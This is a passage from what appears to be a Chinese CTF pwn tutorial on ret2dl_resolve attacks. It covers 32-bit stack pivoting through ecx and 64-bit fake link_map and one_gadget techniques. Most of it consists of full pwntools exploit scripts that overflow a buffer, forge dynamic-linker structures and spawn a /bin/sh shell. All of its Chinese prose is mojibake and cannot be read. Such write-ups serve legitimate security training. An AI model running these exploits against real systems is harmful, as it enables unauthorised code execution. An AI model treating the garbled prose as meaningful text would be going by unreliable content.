ˆä¸Šæ•°æ®\n\n![image-20211216141615732](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211216141616.png)\n\né€šè¿‡fake_Elf32_Rel_addræ¥è·å–åˆ°fake_Elf32_Sym_addrè¿›è¡Œé‡è½½ï¼Œåœ¨ä¹‹åçš„`_dl_fixup`å‡½æ•°ä¸­é‡è½½ç›¸å…³å‡½æ•°ã€‚\n\n![image-20211216141922860](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211216141923.png)\n\nè¿›å…¥systemå‡½æ•°\n\n![image-20211216142029092](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211216142212.png)\n\nå³å¯è°ƒç”¨system('/bin/sh')\n\n![image-20211216142052187](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211216142226.png)\n\n\n\n### (2)64ä½æœºå™¨ç¼–è¯‘çš„32ä½ç¨‹åº\n\n+ æº¢å‡ºé•¿åº¦è¶³å¤Ÿ\n+ å­˜åœ¨å¯ä»¥è¾“å…¥æ•°æ®çš„bssæ®µ\n\nè¿™ç§æƒ…å†µä¸€èˆ¬éœ€è¦ä¸€ä¸ªæˆ‘ä»¬èƒ½å¤Ÿå°†æ•°æ®è¾“å…¥åˆ°bssæ®µçš„åŠŸèƒ½ï¼Œä»è€Œèƒ½å¤Ÿç›´æ¥åŠ«æŒæ ˆã€‚åŸå› å°±æ˜¯åœ¨è¿™ç§æƒ…å†µä¸‹åŒä¸€æ®µä»£ç ç¼–è¯‘ä¹‹åä¼šå‡ºç°ä¸åŒçš„æ•ˆæœï¼Œä»£ç ä¸ºï¼š\n\n```C\n#include <unistd.h>\n#include <string.h>\n\nchar buf[0x500];\n\nint main(void)\n{\n    char dest[0x10];\n    //gets(buf);\n    int n = read(0,buf,0x500);\n    memcpy(dest,buf,0x500);\n    return 0;\n}\n```\n\n#### â‘ åŸç”Ÿæ€32ä½æ•ˆæœ\n\nè¿™ä¸ªç¯å¢ƒä¸­\n\n![image-20211213105819379](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211213105826.png)\n\n#### â‘¡64ä½æœºå™¨ç¼–è¯‘32ä½ç¨‹åºæ•ˆæœ\n\n![image-20211213110012402](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211213110012.png)\n\nç›¸æ¯”è¾ƒåŸå…ˆçš„åŸç”Ÿæ€ï¼Œä¼šå¤šå‡ºæ¥ä¸€äº›æ±‡ç¼–ä»£ç ï¼Œæ¯”è¾ƒæ˜æ˜¾çš„å°±æ˜¯`lea     esp, [ecx-4]`ï¼Œè¿™ä¸ªè¯¦è§Migraineæ®‡å¸ˆå‚…çš„æ–‡ç« \n\n[åœ¨PWNé¢˜ä¸­ç»•è¿‡lea espä»¥åŠå…³äºRet2dlçš„ä¸€äº›è¡¥å…… - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)](https://www.anquanke.com/post/id/187875)\n\næœ‰çš„æ—¶å€™ä¹Ÿä¼šç¼–è¯‘å‡ºå¦‚ä¸‹ä»£ç \n\n![image-20211213205819971](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211213205820.png)\n\nè¿™æ—¶å€™å°±éœ€è¦æˆ‘ä»¬çµæ´»å˜é€šï¼Œé€šè¿‡ä¿®æ”¹æ ˆä¸Šçš„æ•°æ®ï¼Œè¿›è€Œæ§åˆ¶ecxï¼Œå†æ§åˆ¶espï¼Œè¿™æ ·å°±å¯ä»¥ç›´æ¥æ ˆè¿ç§»ï¼Œä»è€Œåœ¨æˆ‘ä»¬å­˜æ”¾æ•°æ®çš„åœ°æ–¹è¿›è¡ŒROPã€‚\n\n#### â‘¢é€šè¿‡ecxåŠ«æŒesp\n\nå³å¦‚ä¸‹å…ˆåŠ«æŒæ ˆåˆ°å­˜æ”¾æ•°æ®çš„bssæ®µ\n\n```python\ndl_resolve = Ret2dlresolvePayload(elf, \"system\", [\"/bin/sh\"])\nr = ROP(elf)\n#r.read(0,dl_resolve.data_addr,0x400)\nr.gets(dl_resolve.data_addr)\nr.ret2dlresolve(dl_resolve)\n\nstack_space = 0x280\noffset_ebp = 0x28\nbuf_addr = 0x0804A040\nROP_chain_addr = buf_addr + stack_space\n\npayload = ''\npayload += \"A\"*(offset_ebp - 0x10)\n#pop ecxçš„æ—¶å€™espæŒ‡å‘è¯¥åœ°å€ï¼Œå°†è¯¥åœ°å€èµ‹ç»™ecxï¼Œä»è€Œé€šè¿‡lea esp,[ecx-4]åŠ«æŒesp\npayload += p32(ROP_chain_addr + 0x4)\npayload = payload.ljust(stack_space,'\\x00')\npayload += r.chain()\n```\n\nè¿™æ ·å°±èƒ½é€šè¿‡ecxæ§åˆ¶espï¼Œä»è€Œè·³è½¬åˆ°æˆ‘ä»¬ä½äºbssæ®µä¸Šçš„ROPé“¾\n\n![image-20211213215116117](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211213215116.png)\n\nä¹‹åå°±æ˜¯ç±»ä¼¼çš„äº†ã€‚\n\n![image-20211216142835635](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211216143113.png)\n\næ‰¾åˆ°systemå‡½æ•°\n\n![image-20211216142921537](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211216143131.png)\n\nè°ƒç”¨å¯¹åº”system('/bin/sh')\n\n![image-20211216143224584](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211216143225.png)\n\n#### ğŸ”ºæ³¨\n\nä½†æ˜¯è¿™é‡Œå°±ä¼šæœ‰ç‚¹ä¸å¤ªå¥½ï¼Œå°±æ˜¯å¦‚æœåŠ«æŒä¹‹åçš„espå°±åœ¨bufé¦–åœ°å€é™„è¿‘ï¼Œé‚£ä¹ˆåœ¨ä¹‹åçš„é‡å®šå‘è¿‡ç¨‹ä¸­ï¼Œä¼šè°ƒç”¨ä¸€ç³»åˆ—å‡½æ•°ï¼Œé‚£ä¹ˆåœ¨ç”Ÿæˆå‡½æ•°æ ˆç©ºé—´çš„æ—¶å€™æ ˆé¡¶å°±ä¼šä¸€ç›´å‘ä¸Šç§»åŠ¨ï¼Œä»è€Œè¦†ç›–åˆ°ä¸èƒ½è¦†ç›–çš„åœ°æ–¹ï¼Œå¯¼è‡´å‡ºé”™\n\n![image-20211213214635928](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211213214636.png)\n\nå¯ä»¥çœ‹åˆ°è¯¥åœ°å€å·²ç»åœ¨å­˜æ”¾é‡å®šå‘è¡¨çš„LOADæ®µäº†ã€‚\n\n![image-20211213214833969](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211213214834.png)\n\næ‰€ä»¥æˆ‘ä»¬ä¹‹å‰å°±è®¾ç½®äº†å­˜æ”¾ROPé“¾çš„æ•°æ®åœ¨bssæ®µé¦–åœ°å€å¤§çº¦0x280çš„åœ°æ–¹ï¼Œè¿™æ ·åŸºæœ¬å°±ä¸ä¼šè¦†ç›–äº†ï¼Œå…¶å®æœ€å¥½èƒ½å¤Ÿå†é•¿å°±å†é•¿ä¸€äº›ï¼Œä¹Ÿä¸ä¼šæœ‰ä»€ä¹ˆåå¤„ã€‚\n\n```python\nstack_space = 0x280\nbuf_addr = 0x0804A040\nROP_chain_addr = buf_addr + stack_space\n```\n\nå®Œæ•´expå¦‚ä¸‹\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\np = process(\"./ret2dl_re32_gets\")\nelf = context.binary = ELF(\"./ret2dl_re32_gets\")\nplt0_addr = elf.get_section_by_name(\".plt\")[\"sh_addr\"]\n\ndynstr_addr, dynsym_addr, relplt_addr = map(elf.dynamic_value_by_tag,\n                                                      [\"DT_STRTAB\", \"DT_SYMTAB\", \"DT_JMPREL\"])\nprint(\"plt0:\", hex(plt0_addr))\nprint(\".dynstr:\", hex(dynstr_addr))\nprint(\".dynsym:\", hex(dynsym_addr))\nprint(\".rel.plt:\", hex(relplt_addr))\n\ndef dbg():\n    global p\n    gdb.attach(p)\n    pause()\n\ndef gdb_a(addr):\n    gdb.attach(p, \"b *{0} \\n c\".format(addr))\n    sleep(0.5)\n\n\ndl_resolve = Ret2dlresolvePayload(elf, \"system\", [\"/bin/sh\"])\nr = ROP(elf)\n#r.read(0,dl_resolve.data_addr,0x400)\nr.gets(dl_resolve.data_addr)\nr.ret2dlresolve(dl_resolve)\n\n\n# .text:0804846E                 lea     esp, [ebp-10h]\n# .text:08048471                 pop     ecx\n# .text:08048472                 pop     ebx\n# .text:08048473                 pop     esi\n# .text:08048474                 pop     edi\n# .text:08048475                 pop     ebp\n# .text:08048476                 lea     esp, [ecx-4]\n# .text:08048479                 retn\n#ç”±äºä¼šåŠ«æŒespåˆ°bufå¤„ï¼Œæ‰€ä»¥æœ€å¥½ç•™å‡ºå¤§çº¦0x280æˆ–ä»¥ä¸Šçš„ç©ºé—´æ¥ä¸ºé‡å®šå‘çš„ä¸€ç³»åˆ—å‡½æ•°\n#ç•™å‡ºæ ˆç©ºé—´ï¼Œä¸ç„¶å°±å¯èƒ½ä¼šä½¿å¾—espæ”¾åˆ°bufæ®µä¸Šé¢ï¼Œè¦†ç›–åˆ°ä¸èƒ½è¦†ç›–çš„åœ°æ–¹\nstack_space = 0x280\noffset_ebp = 0x28\nbuf_addr = 0x0804A040\nROP_chain_addr = buf_addr + stack_space\n\npayload = ''\npayload += \"A\"*(offset_ebp - 0x10)\n#pop ecxçš„æ—¶å€™espæŒ‡å‘è¯¥åœ°å€ï¼Œå°†è¯¥åœ°å€èµ‹ç»™ecxï¼Œä»è€Œé€šè¿‡lea esp,[ecx-4]åŠ«æŒesp\npayload += p32(ROP_chain_addr + 0x4)\npayload = payload.ljust(stack_space,'\\x00')\npayload += r.chain()\n\ngdb_a(0x08048464)\np.sendline(payload)\npause()\nsleep(1)\np.sendline(dl_resolve.payload)\np.interactive()\n```\n\n### (3)åŸç”Ÿæ€64ä½\n\nè¿™ä¸ªå°±æ¯”è¾ƒæ­£å¸¸äº†ï¼Œä¸€èˆ¬æ˜¯ä¸¤ç§æ¨¡å¼\n\n#### â‘ æœ‰readå’Œæ³„éœ²å‡½æ•°\n\nè¿™ä¸ªå°±æ˜¯æœ€æ­£å¸¸çš„ret2dl_resolveï¼Œç›´æ¥æ‹¿æ¨¡æ¿æ‰“å³å¯ï¼Œå‚ç…§bsauceå¸ˆå‚…çš„æ¨¡æ¿\n\nä¸è¿‡è¿™ä¸ªreadæ¢æˆgetså¥½åƒä¸å¤ªå¥½ä½¿ï¼Œä¹Ÿå¯èƒ½æ˜¯æ²¡è®¾ç½®å¥½ï¼Œ**å›å¤´è¯•è¯•**\n\n[32ä½/64ä½dlresolveæœ€å…¨æ€»ç»“ï¼ˆä¸ç”¨æ³„éœ²åœ°å€-æ‰§è¡Œone_gadgetï¼‰ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)](https://xz.aliyun.com/t/5722#toc-2)\n\n```python\n#!/usr/bin/python\n#coding:utf-8\nfrom pwn import *\n\n#éœ€ä¿®æ”¹:æ–‡ä»¶åã€æº¢å‡ºåç§»ã€leave_retåœ°å€\nfpath = './myRet2dl_puts'\nelf = ELF(fpath)\np = process(fpath)\n\noffset_rbp = 0x80\n#è¯»å–é•¿åº¦\nlength = 0x400\nstack_size = 0x800\n#mainå‡½æ•°ä¸­æ‰¾\nleave_ret=0x40066A\n\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\nuu32    = lambda data   :u32(data.ljust(4, '\\0'))\nuu64    = lambda data   :u64(data.ljust(8, '\\0'))\nu64Leakbase = lambda offset :u64(ru(\"\\x7f\")[-6: ] + '\\0\\0') - offset\nu32Leakbase = lambda offset :u32(ru(\"\\xf7\")[-4: ]) - offset\nit      = lambda                    :p.interactive()\n\n\ndef lg(string,addr):\n    print('\\033[1;31;40m%20s-->0x%x\\033[0m'%(string,addr))\n\n\ndef gdb_a(addr):\n    gdb.attach(p, \"b *{0} \\n c\".format(addr))\n    sleep(0.5)\n\ndef makecall(addr, rdi,rsi,rdx,tail = 0):\n    payload = ''\n    payload += p64(p6_addr)\n    payload += p64(0x0)\n    payload += p64(0x1)\n    payload += p64(addr)\n    payload += p64(rdi)\n    payload += p64(rsi)\n    payload += p64(rdx)\n    payload += p64(call_addr)\n    if (tail):\n        payload += p64(0x0) * 7 + p64(tail)\n    return payload\n\n\nmain_addr=elf.sym['main']\np6_addr=elf.sym['__libc_csu_init'] + 0x5a\ncall_addr=elf.sym['__libc_csu_init'] + 0x40\np_rdi_ret=elf.sym['__libc_csu_init'] + 0x63\np_rbp_ret=elf.sym['register_tm_clones'] + 0x38\n\ncmd = \"/bin/sh\"\nplt_0 = elf.get_section_by_name(\".plt\")[\"sh_addr\"]\ndynstr, dynsym, rel_plt = map(elf.dynamic_value_by_tag,\n                                                      [\"DT_STRTAB\", \"DT_SYMTAB\", \"DT_JMPREL\"])\n\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\n# write_got = elf.got['write']\n# write_plt = elf.plt['write']\nread_got=elf.got['read']\nread_plt = elf.plt['read']\ngot_8=elf.get_section_by_name('.got.plt').header.sh_addr+8   #0x601008\nbss_addr =elf.get_section_by_name('.bss').header.sh_addr\nbase_stage = bss_addr + stack_size\n#print 'got_8=',hex(got_8)\n\nlg(\"main_addr\",main_addr)\nlg(\"p6_addr\",p6_addr)\nlg(\"p_rdi_ret\",p_rdi_ret)\nlg(\"p_rbp_ret\",p_rbp_ret)\nlg(\"plt_0\",plt_0)\nlg(\"dynstr\",dynstr)\nlg(\"dynsym\",dynsym)\nlg(\"rel_plt\",rel_plt)\nlg(\"puts_got\",puts_got)\nlg(\"puts_plt\",puts_plt)\n# lg(\"write_got\",write_got)\n# lg(\"write_plt\",write_plt)\nlg(\"read_got\",read_got)\nlg(\"read_plt\",read_plt)\nlg(\"got_8\",got_8)\nlg(\"bss_addr\",bss_addr)\nlg(\"base_stage\",base_stage)\n\n#p.recvuntil(\"Welcome!\\n\")        # 'Welcome to XDCTF2015~!\\n'\n#1.æ³„éœ²&link_mapåœ°å€\npayload='\\x00'*offset_rbp\npayload+='\\x00'*8\npayload+=makecall(puts_got,got_8,0,0,tail=main_addr)\n#payload+=makecall(write_got,1,got_8,8,tail=main_addr)\n#è¿™lengthçœ‹å…·ä½“æƒ…å†µï¼Œæ²¡å•¥ç”¨\npayload=payload.ljust(length,'\\x00')\n#gdb_a(0x400674)\np.send(payload)\n#p.send(payload)\n#p.interactive()\n#pause()\nlink_map = u64Leakbase(0)\n#pause()\nprint 'link_map=',hex(link_map)\n\n#2.å¾€link_map+0x1c8å†™0\npayload='\\x00'*offset_rbp\npayload+='\\x00'*8\npayload+=makecall(read_got,0,link_map+0x1c8,8,tail=main_addr)\n#è¿™lengthçœ‹å…·ä½“æƒ…å†µï¼Œæ²¡å•¥ç”¨\npayload=payload.ljust(length,'\\x00')\np.send(payload)\np.send(p64(0))\n\n#3.å¾€base_stageå†™å…¥ä¼ªé€ ç»“æ„å¹¶è·³è¿‡å»\npayload='\\x00'*offset_rbp\npayload+='\\x00'*8\npayload+=makecall(read_got,0,base_stage,0xd0,tail=0)   #å‡è®¾ç»“æ„å¤§å°æ˜¯400\npayload+=p64(0)*2+p64(base_stage)+p64(0)*4\npayload+=p64(leave_ret)\n#è¿™lengthçœ‹å…·ä½“æƒ…å†µï¼Œæ²¡å•¥ç”¨\npayload=payload.ljust(length,'\\x00')\np.send(payload)\n\n\n#4.bssæ•°æ®ï¼šrop-å‚æ•°æ”¾åœ¨å¯„å­˜å™¨/ ä¼ªé€ ç»“æ„  \n#(1)ç¡®å®šå„ä¸ªèŠ‚çš„åœ°å€ \n\n#(2)ç¡®å®šé‡å®šä½ä¸‹æ ‡\nindex_offset = base_stage + 7*8\nalign = 24 - ((index_offset-rel_plt) % 24)  # è¿™é‡Œçš„å¯¹é½æ“ä½œæ˜¯å› ä¸ºdynsymé‡Œçš„ELF64_R_SYMç»“æ„ä½“éƒ½æ˜¯24å­—èŠ‚å¤§å°\nindex_offset = index_offset + align\nindex = (index_offset - rel_plt) / 24 # base_stage + 7*8 æŒ‡å‘fake_relocï¼Œå‡å»rel_pltå³åç§»\n#(3)ç¡®å®šåŠ¨æ€é“¾æ¥ç¬¦å·ä¸‹æ ‡\nfake_sym_addr = base_stage + 13*8\nalign = 24 - ((fake_sym_addr - dynsym) % 24)# è¿™é‡Œçš„å¯¹é½æ“ä½œæ˜¯å› ä¸ºdynsymé‡Œçš„Elf64_Symç»“æ„ä½“éƒ½æ˜¯24å­—èŠ‚å¤§å°\nfake_sym_addr = fake_sym_addr + align\nindex_dynsym = (fake_sym_addr - dynsym) / 24 # é™¤ä»¥24å› ä¸ºElf64_Symç»“æ„ä½“çš„å¤§å°ä¸º24ï¼Œå¾—åˆ°writeçš„dynsymç´¢å¼•å·\n#(4)ä¼ªé€ é‡å®šä½ç»“æ„+åŠ¨æ€é“¾æ¥ç»“æ„\nr_info = (index_dynsym << 32) | 0x7\nfake_reloc = p64(puts_got) + p64(r_info) + p64(0)\n#fake_reloc = p64(write_got) + p64(r_info) + p64(0)\nst_name = (fake_sym_addr + 24) - dynstr   #fake_symï¼ˆElf32_Symç»“æ„ä½“ï¼‰å¤§å°0x10\nfake_sym = p32(st_name) + p32(0x12) + p64(0) + p64(0)\n\npayload2 = 'AAAAAAAA'\npayload2 += p64(p_rdi_ret)\npayload2 += p64(base_stage+0xc0)   #/bin/sh\npayload2 += p64(plt_0)\npayload2 += p64(index)       #jmprel ä¸‹æ ‡å‚æ•°\npayload2 += 'AAAAAAAA'       #è¿”å›åœ°å€\npayload2 += 'aaaaaaaa'\n\npayload2 = payload2.ljust(index_offset-base_stage,'B')\npayload2 += fake_reloc # index_offset(base_stage+7*8)çš„ä½ç½®\npayload2 = payload2.ljust(fake_sym_addr-base_stage,'B')\npayload2 += fake_sym   # fake_sym_addr(base_stage+9*8)çš„ä½ç½®\n\npayload2 += \"system\\x00\"\npayload2 = payload2.ljust(0xc0,'\\x00')\npayload2 += cmd + '\\x00'\npayload2 = payload2.ljust(0xd0,'\\x00')\n#gdb.attach(p,'b *0x4006ab')\nraw_input('wait!!\\n')\np.send(payload2)\np.interactive()\n```\n\nå¦‚æœæ˜¯putså‡½æ•°åˆ™ç›´æ¥å¯¹åº”ä¿®ä¿®è¡¥è¡¥å³å¯\n\n#### â‘¡åªæœ‰readå’Œlibcæ–‡ä»¶\n\nè¿™ä¸ªæœ€å¼€å§‹çš„é¢˜ç›®å¥½åƒæ˜¯0CTFçš„é¢˜ç›®blackhole2ï¼Œè¿™ç§æƒ…å†µä¹Ÿå¯ä»¥å¯¹åº”æ‹¿æ¨¡æ¿æ‰“ï¼ŒåŸç†å°±æ˜¯è°ƒç”¨libcä¸­çš„one_gadgetæ¥getshellã€‚è¿™ä¸ªæ¨¡æ¿ä¹Ÿæ˜¯å‚ç…§bsauceå¸ˆå‚…çš„æ¨¡æ¿ã€‚\n\n```python\n#!/usr/bin/python\n#coding:utf-8\nfrom pwn import *\n\n#éœ€ä¿®æ”¹:æ–‡ä»¶åã€æº¢å‡ºåç§»ã€gadgetåœ°å€ã€å„èŠ‚åœ°å€\nfpath = './bstack'\nelf = ELF(fpath)\nlibc = elf.libc\n#libc = ELF('./libc.so.6')\np = process(fpath)\n\n\noffset_rbp = 0x70\nlength = 0x100\nstack_size = 0x800\nleave_ret=0x00000000004006AB\n#one_gadgetå·¥å…·æ¥æ‰¾\none_gadget = 0x4f432\nvuln_addr=0x400676\n\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\nuu32    = lambda data   :u32(data.ljust(4, '\\0'))\nuu64    = lambda data   :u64(data.ljust(8, '\\0'))\nu64Leakbase = lambda offset :u64(ru(\"\\x7f\")[-6: ] + '\\0\\0') - offset\nu32Leakbase = lambda offset :u32(ru(\"\\xf7\")[-4: ]) - offset\nit      = lambda                    :p.interactive()\n\ndef lg(string,addr):\n    print('\\033[1;31;40m%20s-->0x%x\\033[0m'%(string,addr))\n\ndef gdb_a(addr):\n    gdb.attach(p, \"b *{0} \\n c\".format(addr))\n    sleep(0.5)\n\n\ndef makecall(addr, rdi, rsi, rdx, tail = 0):\n    payload = ''\n    payload += p64(p6_addr)\n    payload += p64(0x0)\n    payload += p64(0x1)\n    payload += p64(addr)\n    payload += p64(rdx)\n    payload += p64(rsi)\n    payload += p64(rdi)\n    payload += p64(call_addr)\n    if (tail):\n        payload += p64(0x0) * 7 + p64(tail)\n    return payload\n\n\n\nplt_0 = elf.get_section_by_name(\".plt\")[\"sh_addr\"]\np6_addr=elf.sym['__libc_csu_init'] + 0x5a\ncall_addr=elf.sym['__libc_csu_init'] + 0x40\np_rdi_ret=elf.sym['__libc_csu_init'] + 0x63\np_rbp_ret=elf.sym['register_tm_clones'] + 0x38\nread_got=elf.got['read']\nread_plt = elf.plt['read']\ngot_8=elf.get_section_by_name('.got.plt').header.sh_addr+8   #0x601008\nbss_addr =elf.get_section_by_name('.bss').header.sh_addr\nlibc_bss_addr = libc.get_section_by_name('.bss').header.sh_addr\nbase_stage = bss_addr + stack_size\nlibc_start_main_addr = libc.sym['__libc_start_main']\nfake_link_map=elf.got['__libc_start_main']    #change!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\nfake_st_value=one_gadget-libc_start_main_addr    #0x4526a   0xf02a4     0xf1147\nfake_r_offset=libc_bss_addr-libc_start_main_addr\n# fake_st_value=0x4526a-0x20740    #0x4526a   0xf02a4     0xf1147\n# fake_r_offset=0x3c5720-0x20740\n\nval_0x68=base_stage+0xc0-8    #0x600ea8\nval_0x70=base_stage+0xc0-8    #0x600eb8\nval_0xf8=base_stage+0xc0-8    #0x600f28\nwait_time=0.1\n\n#print p.recv()        # 'Welcome to XDCTF2015~!\\n'\n\n#1.å¾€fake_link_map+0x68å†™å€¼\npayload='\\x00'*offset_rbp\npayload+='\\x00'*8\npayload+=makecall(read_got,0,fake_link_map+0x68,16,tail=vuln_addr)\npayload=payload.ljust(0x100,'\\x00')\n#gdb_a(0x4006AA)\np.send(payload)\n#pause()\nsleep(wait_time)\np.send(p64(val_0x68)+p64(val_0x70))\n\n#2.å¾€fake_link_map+0xf8å†™å€¼\npayload='\\x00'*offset_rbp\npayload+='\\x00'*8\npayload+=makecall(read_got,0,fake_link_map+0xf8,8,tail=vuln_addr)\npayload=payload.ljust(0x100,'\\x00')\np.send(payload)\nsleep(wait_time)\np.send(p64(val_0xf8))\n\n#3.å¾€base_stageå†™å…¥ä¼ªé€ ç»“æ„å¹¶è·³è¿‡å»\npayload='\\x00'*offset_rbp\npayload+='\\x00'*8\npayload+=makecall(read_got,0,base_stage,0xd0,tail=0)   #å‡è®¾ç»“æ„å¤§å°æ˜¯400\npayload+=p64(0)*2+p64(base_stage)+p64(0)*4\npayload+=p64(leave_ret)\npayload=payload.ljust(0x100,'\\x00')\np.send(payload)\n\n\n#4.bssæ•°æ®ï¼šrop-å‚æ•°æ”¾åœ¨å¯„å­˜å™¨/ ä¼ªé€ ç»“æ„  \n#(1)ç¡®å®šå„ä¸ªèŠ‚çš„åœ°å€ \nplt_1 = plt_0+6\n#(2)ç¡®å®šé‡å®šä½ä¸‹æ ‡\nalign = 24 - (56 % 24)  # è¿™é‡Œçš„å¯¹é½æ“ä½œæ˜¯å› ä¸ºdynsymé‡Œçš„ELF64_R_SYMç»“æ„ä½“éƒ½æ˜¯24å­—èŠ‚å¤§å°\nindex_offset = base_stage + 7*8 + align\nindex = (7*8 + align) / 24 # base_stage + 7*8 æŒ‡å‘fake_relocï¼Œå‡å»rel_pltå³åç§»\n#(3)ç¡®å®šåŠ¨æ€é“¾æ¥ç¬¦å·ä¸‹æ ‡\nalign = 24 - ((13*8) % 24)# è¿™é‡Œçš„å¯¹é½æ“ä½œæ˜¯å› ä¸ºdynsymé‡Œçš„Elf64_Symç»“æ„ä½“éƒ½æ˜¯24å­—èŠ‚å¤§å°\nfake_sym_addr = base_stage + 13*8 + align\nindex_dynsym = (13*8 + align) / 24 # é™¤ä»¥24å› ä¸ºElf64_Symç»“æ„ä½“çš„å¤§å°ä¸º24ï¼Œå¾—åˆ°writeçš„dynsymç´¢å¼•å·\n#(4)ä¼ªé€ é‡å®šä½ç»“æ„+åŠ¨æ€é“¾æ¥ç»“æ„\nr_info = (index_dynsym << 32) | 0x7\nfake_reloc = p64(fake_r_offset) + p64(r_info) + p64(0)\nfake_sym = p32(0) + p32(0x112) + p64(fake_st_value) + p64(0)\n\npayload2 = p64(0)#'AAAAAAAA'\npayload2 += p64(p_rdi_ret)\npayload2 += p64(base_stage+0xc0)   #/bin/sh\npayload2 += p64(plt_1)\npayload2 += p64(fake_link_map)   #\npayload2 += p64(index)       #jmprel ä¸‹æ ‡å‚æ•°\npayload2 += p64(0)       #è¿”å›åœ°å€\n\npayload2 = payload2.ljust(index_offset-base_stage,'\\x00')\npayload2 += fake_reloc # index_offset(base_stage+7*8)çš„ä½ç½®\npayload2 = payload2.ljust(fake_sym_addr-base_stage,'\\x00')\npayload2 += fake_sym   # fake_sym_addr(base_stage+9*8)çš„ä½ç½®\npayload2 = payload2.ljust(0xc0,'\\x00')\npayload2 += p64(base_stage)\npayload2 = payload2.ljust(0xd0,'\\x00')\n\np.send(payload2)\nsleep(wait_time)\np.interactive()\n```\n\n#### â‘¢åªæœ‰readæ—¶\n\nè¿™ç§æƒ…å†µä¸€èˆ¬éœ€è¦çˆ†ç ´libcæ–‡ä»¶ï¼Œä½†æ˜¯éœ€è¦ä¸€ä¸ªåº“ï¼Œæ‰€ä»¥è¿˜å¾—è‡ªå·±å‡†å¤‡ä¸€ä¸ªæ¯”è¾ƒå®Œæ•´çš„libcæ–‡ä»¶åº“ï¼Œè¿™é‡Œè‡ªå·±å†™äº†ä¸€ä¸ªå·¥å…·ï¼Œä¸“é—¨ç”¨æ¥ä¾æ®libcæ–‡ä»¶åº“çˆ†ç ´ï¼Œç›´æ¥ç»™å‡ºä»£ç ï¼Œè¿™ä¸ªç­‰æˆ‘å•¥æ—¶å€™æœ‰æ—¶é—´è¯¦ç»†å®Œæˆä¸€ä¸‹è¿™ä¸ªå·¥å…·ã€‚\n\n```python\n#coding:utf-8\nfrom pwn import *\nimport myTool\n\n#éœ€ä¿®æ”¹:æ–‡ä»¶åã€æº¢å‡ºåç§»ã€gadgetåœ°å€ã€å„èŠ‚åœ°å€\nglobal p\nfpath = './bstack'\n\noffset_rbp = 0x70\nlength = 0x100\nstack_size = 0x800\nleave_ret=0x00000000004006AB\nvuln_addr=0x400676\n\n\n#p = process(fpath)\n#arch = \"x86-64\"/\"i386\"\nlibc_list = myTool.getLibc(\"x86-64\",version=\"2.27\")\nlibcAll_path = '/home/hacker/LibcSearcher/libc-database/libcAllSo/'\nelf = ELF(fpath)\n\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\nuu32    = lambda data   :u32(data.ljust(4, '\\0'))\nuu64    = lambda data   :u64(data.ljust(8, '\\0'))\nu64Leakbase = lambda offset :u64(ru(\"\\x7f\")[-6: ] + '\\0\\0') - offset\nu32Leakbase = lambda offset :u32(ru(\"\\xf7\")[-4: ]) - offset\nit      = lambda                    :p.interactive()\n\ndef lg(string,addr):\n    print('\\033[1;31;40m%20s-->0x%x\\033[0m'%(string,addr))\n\ndef gdb_a(addr):\n    gdb.attach(p, \"b *{0} \\n c\".format(addr))\n    sleep(0.5)\n\n\ndef makecall(p6_addr,call_addr,addr, rdi, rsi, rdx, tail = 0):\n    payload = ''\n    payload += p64(p6_addr)\n    payload += p64(0x0)\n    payload += p64(0x1)\n    payload += p64(addr)\n    payload += p64(rdx)\n    payload += p64(rsi)\n    payload += p64(rdi)\n    payload += p64(call_addr)\n    if (tail):\n        payload += p64(0x0) * 7 + p64(tail)\n    return payload\n\n\n#cat flag\ndef regexp_out(data):\n    patterns = [\n        re.compile(r'flag{.*?}'),\n        re.compile(r'xnuca{(.*?)}'),\n        re.compile(r'DASCTF{(.*?)}'),\n        re.compile(r'WMCTF{.*?}'),\n        re.compile(r'[0-9a-zA-Z]{8}-[0-9a-zA-Z]{3}-[0-9a-zA-Z]{5}'),\n    ]\n    for pattern in patterns:\n        res = pattern.findall(data.decode() if isinstance(data, bytes) else data)\n        if len(res) > 0:\n            return str(res[0])\n    return None\n\n\ndef pwn(libcFile,one_gadget):\n    #libc = ELF(\"./libc.so.6\",checksec = False)\n    #one_gadget = 0x4f432\n\n    libc = ELF(libcFile,checksec = False)\n\n    plt_0 = elf.get_section_by_name(\".plt\")[\"sh_addr\"]\n    p6_addr=elf.sym['__libc_csu_init'] + 0x5a\n    call_addr=elf.sym['__libc_csu_init'] + 0x40\n    p_rdi_ret=elf.sym['__libc_csu_init'] + 0x63\n    p_rbp_ret=elf.sym['register_tm_clones'] + 0x38\n    read_got=elf.got['read']\n    read_plt = elf.plt['read']\n    got_8=elf.get_section_by_name('.got.plt').header.sh_addr+8   #0x601008\n    bss_addr =elf.get_section_by_name('.bss').header.sh_addr\n    libc_bss_addr = libc.get_section_by_name('.bss').header.sh_addr\n    base_stage = bss_addr + stack_size\n    libc_start_main_addr = 